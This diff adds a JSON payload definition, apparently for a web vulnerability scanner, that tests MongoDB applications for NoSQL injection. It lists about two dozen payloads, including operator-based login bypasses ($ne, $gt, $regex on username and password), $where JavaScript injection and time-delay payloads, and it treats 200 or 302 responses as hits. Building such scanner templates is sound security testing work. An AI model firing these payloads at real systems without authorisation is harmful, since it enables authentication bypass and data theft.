@@ -1,0 +1,151 @@
+[
+  {
+    "id": "nosql-basic",
+    "info": {
+      "name": "NoSQL Injection - MongoDB",
+      "severity": "critical",
+      "category": "injection",
+      "description": "Tests for NoSQL injection vulnerabilities in MongoDB and similar databases",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
+      ],
+      "tags": [
+        "nosql",
+        "injection",
+        "mongodb"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "' || '1'=='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' || 1==1//",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' || 1==1%00",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "admin' || '1==1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{\"$gt\":\"\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$ne\":null}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$ne\":\"\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$where\":\"1==1\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$where\":\"this.password.match(/.*/)!=null\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "'; return true; var foo='bar",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "'; return 'a'=='a'; var foo='bar",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "'; sleep(5000); var a='",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "';var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); var foo='bar",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{\"$regex\":\"^admin\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$nin\":[\"\"]}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$in\":[\"admin\",\"administrator\",\"root\"]}}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "[$ne]=1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "username[$ne]=admin&password[$ne]=admin",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "username[$regex]=.*&password[$regex]=.*",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "username[$gt]=&password[$gt]=",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$eq\":\"admin\"},\"password\":{\"$regex\":\"^\"}}",
+        "encoding": "none",
+        "method": "POST"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": [
+          "200",
+          "302"
+        ]
+      }
+    ]
+  }
+]
